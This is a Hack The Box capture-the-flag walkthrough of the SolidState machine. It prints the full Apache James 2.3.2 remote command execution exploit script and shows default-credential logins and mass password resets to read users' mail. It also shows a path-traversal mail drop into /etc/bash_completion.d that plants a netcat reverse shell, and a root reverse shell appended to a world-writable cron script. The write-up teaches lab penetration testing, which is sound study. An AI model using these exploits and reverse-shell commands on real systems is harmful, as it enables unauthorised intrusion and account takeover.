# Hack The Box - SolidState Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.51 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 06:51 EST
WARNING: RST from 10.10.10.51 port 22 -- is this port really open?
Nmap scan report for 10.10.10.51
Host is up (0.26s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.2 [10.10.16.2])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
119/tcp open  nntp    JAMES nntpd (posting ok)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/26%OT=22%CT=1%CU=34793%PV=Y%DS=2%DC=I%G=Y%TM=63D269B
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=101%GCD=1%ISR=106%TI=Z%II=I%TS=8)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O
OS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M537NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T2(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.57 seconds

```

We get back the following result showing that 2 ports are open:
- Port `22`: running `OpenSSH 7.4p1`.
- Port `25`: running `smtpd 2.3.2`.
- Port `80`: running `Apache httpd 2.4.25`.
- Port `110`: running `pop3d 2.3.2`.
- Port `119`: running `nntpd`.

Before starting enumeration, I ran a more comprehensive `nmap` scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports. The idea behind using `Rustscan` is that it is faster compared to Nmap since `Rustscan` using Multi-threading but doesnt have service, OS, script scan features. So, I basically used `Rustscan` to find open ports and If I find them, i'll only scan those ports for services, version & OS detection using Nmap, making it faster and much efficient.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ rustscan -a 10.10.10.51 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.51:22
Open 10.10.10.51:25
Open 10.10.10.51:80
Open 10.10.10.51:110
Open 10.10.10.51:119
Open 10.10.10.51:4555
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,25,80,110,119,4555 10.10.10.51

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 06:52 EST
Initiating Ping Scan at 06:52
Scanning 10.10.10.51 [2 ports]
Completed Ping Scan at 06:52, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:52
Completed Parallel DNS resolution of 1 host. at 06:52, 4.01s elapsed
DNS resolution of 1 IPs took 4.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating Connect Scan at 06:52
Scanning 10.10.10.51 [6 ports]
Discovered open port 22/tcp on 10.10.10.51
Discovered open port 80/tcp on 10.10.10.51
Discovered open port 110/tcp on 10.10.10.51
Discovered open port 25/tcp on 10.10.10.51
Discovered open port 119/tcp on 10.10.10.51
Discovered open port 4555/tcp on 10.10.10.51
Completed Connect Scan at 06:52, 0.34s elapsed (6 total ports)
Nmap scan report for 10.10.10.51
Host is up, received syn-ack (0.23s latency).
Scanned at 2023-01-26 06:52:11 EST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
25/tcp   open  smtp    syn-ack
80/tcp   open  http    syn-ack
110/tcp  open  pop3    syn-ack
119/tcp  open  nntp    syn-ack
4555/tcp open  rsip    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.62 seconds

```

So, Rustscan found 6 open ports and the results are: 

- Port `22`: running `ssh`.
- Port `25`: running `smtp`.
- Port `80`: running `http`.
- Port `110`: running `pop3`.
- Port `119`: running `nntp`.
- Port `4555`: running `rsip`.

So then, I started nmap scan to find the services running on port `4555`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ nmap -A -p 4555 10.10.10.51 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 07:23 EST
Nmap scan report for 10.10.10.51
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=1/26%Time=63D270BC%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.76 seconds
                                                               
```
Then I scanned those `6` port for deafault vuln scripts by nmap.

```

```

## Enumeration
I visited `http://10.10.10.52` at port `80` in the browser.

img-1

I visited all the pages in the application and didn’t find anything useful. Then, I ran gobuster.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.51
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.51
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/26 07:40:41 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]
===============================================================
2023/1/26 7:43:46 Finished
===============================================================
```

I found nothing useful, so I decided to move on to enemurate port `4555`

I ran `searchsploit` on teh software name and version

```
searchsploit Apache James Server 2.3.2
```

And found a RCE exploit

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ searchsploit Apache James Server 2.3.2

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                      | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                      | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                            | linux/remote/50347.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Now, I transferred the exploit to my current directory.

```
searchsploit -m 35513
```

Now, I reviewd the script to see its contents and understand how it works.

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ cat 35513.py 
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."  
```

After reviewing the code, I noticed a few important things.
1. This is an authenticated exploit, so we need credentials. The exploit uses the default credentials `root:root` that are probably shipped with the software. We’ll have to connect to the server to find out if these credentials are valid before we run this exploit.
2. When running the exploit we have to pass the `IP address` as an argument. The script by default connects to port `4555` which is good since our server is running on that port.
3. The script first creates a user with username `../../../../../../../../etc/bash_completion.d` and password `exploit`. It then connects to the `SMTP` server and sends that user a payload.

Before moving on further, I tried to connect to port `4555` using `netcat` to try and enumerate it further.
I used root:root as credentials which I saw in the exploit.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listuserss
Unknown command listuserss
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Here, I could se a couple of users and I guess the `../../../../../../../../etc/bash_completion.d` user would also be added once we run the exploit.

After a bit of research we find that the vulnerability is in the `adduser` functionality. When a new user is added, the server creates a new subdirectory to store incoming and outgoing emails for that user. However, the username field is not properly validated. Therefore, when we’re creating a user with the username `../../../../../../../../etc/bash_completion.d`, any mail that gets sent to that user will be stored in that directory path.

Why is that dangerous? Long story short, anything under the directory /etc/bash_completion.d is automatically loaded by Bash for all users! I used this [blog](https://iridakos.com/programming/2018/03/01/bash-programmable-completion-tutorial) to understand the impact of this vulnerability.
 
Now, from out prev connection with netcat and port `4555`, we can create a new user and then access their accounts.
 
Since, there's a user with  username as `mailadmin`, I'll check it out first.

```
setpassword mailadmin password
Password for mailadmin reset
```
 
Now that we reset the password for the mailadmin account, let’s access `mailadmin's` email using telnet.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
USER mailadmin
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
LIST
-ERR
PASS password
+OK Welcome mailadmin
LIST    
+OK 0 0
.
```

There was no mails in `mailadmin's` mail address. So, next, I tried resetting other user's passwords.

```
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
```

Now that I've sent a request to reset every user's password, I went on to check if any of the users received mail on the mail server.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
USER mindy
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

```

After going through everyone's mail, I found out that mindy had 2 emails in her inbox

The first email was useless but the second email gives us SSH credentials!

So, I tried to ssh into the machine using mindy's credentials

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ ssh mindy@10.10.10.51                 
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
[REDACTED]

```

SSH-ing into mindy's account, I was able to retrieve the user flag

## Privilege Escalation
Once, I retrieved the user flag, I tried to move around the directories, and I found out that I was in a restricted bash shell (rbash). A restricted shell is a shell that restricts a user by blocking/restricting some of the commands. 
And that's why, when I tried running `whoami`, I got `command not found`

```
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```

I tried several things that you can do to try and break out of a restricted shell but none of them seem to work.

So, going back to the RCE that I found, I decided to create a user with username `../../../../../../../../etc/bash_completion.d` and password `password`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ nc 10.10.10.51 4555        
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
rPassword:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
adduser ../../../../../../../../etc/bash_completion.d password
User ../../../../../../../../etc/bash_completion.d added

```

Going back to the mail server to check whether I've received a mail for creating a new user.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
EHLO bla.bla
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Thu, 26 Jan 2023 09:04:23 -0500 (EST)
250-solidstate Hello bla.bla (10.10.16.2 [10.10.16.2])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: <'random@random.com>
250 2.1.0 Sender <'random@random.com> OK
RCPT TO: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
DATA
354 Ok Send data ending with <CRLF>.<CRLF>
FROM: bla.bla
'
/bin/nc -e /bin/bash 10.10.16.2 1234
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.

```

I found out this trick from [Rana Khalil's blog](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/solidstate-writeup-w-o-metasploit).

Next, I'll set up a netcat listener to receive the reverse shell.

```
nc -nlvp 1234
```

Then I SSH-ed into Mindy’s account so that the content of the `bash_completion` directory is loaded.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ nc -lvnp 1234      
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.51] 51532
ls
bin
user.txt
whoami
mindy
python -c 'import pty; pty.spawn("/bin/bash")'
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```
 
And I got a reverse bash shell with no restrictions, and since it wasnt't a better shell, I upgraded it to a better shell

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
 
I tried running `sudo -l`, but it said `command not found`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ sudo -l
sudo -l
bash: sudo: command not found
```

So, next, I decided to upload and run `linpeas.sh` to attack the target machine

Firstly, I started a server in the same directory that the script resides.

```python
python3 -m http.server 8081
```

Then, on the target machine, I moved to `/dev/shm` where I had write and execute privileges and downloaded the `Linpeas` script

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /dev/shm
cd /dev/shm
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget http://10.10.16.2:8081/linpeas.sh
6.2:8081/linpeas.sh6
--2023-01-26 09:42:41--  http://10.10.16.2:8081/linpeas.sh
Connecting to 10.10.16.2:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 758.81K   679KB/s    in 1.1s    

2023-01-26 09:42:43 (679 KB/s) - ‘linpeas.sh’ saved [777018/777018]

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls
ls
linpeas.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x linpeas.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./linpeas.sh
./linpeas.sh
...
```

After viewing the results carefully, I didn't find anything interesting. So, I decided to upload `pspy` to check the 

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget http://10.10.16.2:8081/pspy32
6.2:8081/pspy3210.16
--2023-01-26 09:52:05--  http://10.10.16.2:8081/pspy32
Connecting to 10.10.16.2:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2940928 (2.8M) [application/octet-stream]
Saving to: ‘pspy32’

pspy32              100%[===================>]   2.80M  1.73MB/s    in 1.6s    

2023-01-26 09:52:07 (1.73 MB/s) - ‘pspy32’ saved [2940928/2940928]

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x pspy32
chmod +x pspy32
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./pspy32
./pspy32
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

```


After a minute I saw an interesting process pop up.

```
2023/01/26 09:54:01 CMD: UID=0     PID=21164  | python /opt/tmp.py 
```

I viewew the permissions on the `/opt/tmp.py` file and everyone had `read/write/execute` privileges on it.

So, all I needed to do is change the contents of the file to send a reverse shell to my attack machine and then simply wait for the cron job to send a privileged shell back.

```
echo "os.system('/bin/nc -e /bin/bash 10.10.16.2 7777')" >> /opt/tmp.py
```

Set up a listener to receive the reverse shell.
```
nc -lvnp 7777
```

Waited for a minute or so for the cron job to run.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SolidState]
└─$ nc -lvnp 7777    
listening on [any] 7777 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.51] 53738
whoami 
root

```

And I got a root shell and went on to grab the root flag.

```
cat /root/root.txt
[REDACTED]
```

## Lessons Learned

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Use of default credentials. The administrator used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack.
2. Information disclosure. SSH credentials are stored in plaintext in one of the user’s emails. If it is necessary that the password be transmitted by email, the user should have changed the password upon the first login.
3. A Remote Code Execution (RCE) vulnerability with the James Remote server that allowed us to gain initial access to the machine. This could have been avoided if the user had patched the system and installed the most recent version of the software.
 

